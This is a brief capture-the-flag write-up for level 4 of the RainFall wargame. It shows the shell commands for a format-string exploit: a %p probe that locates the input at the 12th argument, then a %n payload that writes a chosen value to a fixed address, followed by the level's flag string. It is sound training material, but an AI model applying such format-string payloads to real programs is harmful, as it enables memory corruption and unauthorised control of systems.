# level 4

In this level, we will use the same exploit than previous level

We will need understand at which element our content is written

```bash
level4@RainFall:~$ python -c "print('BBBB' + '%p ' * 12)" |  ./level4 
BBBB0xb7ff26b0 0xbffff784 0xb7fd0ff4 (nil) (nil) 0xbffff748 0x804848d 0xbffff540 0x200 0xb7fd1ac0 0xb7ff37d0 0x42424242
```
As we can see, we will need to use the 12th argument

If you want some specific explains, please read the [gdb writeup](gdbwriteup.md)

```bash
level4@RainFall:~$ python -c 'print("\x10\x98\x04\x08" + "%16930112c%12$n")' | ./level4
[...] 
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```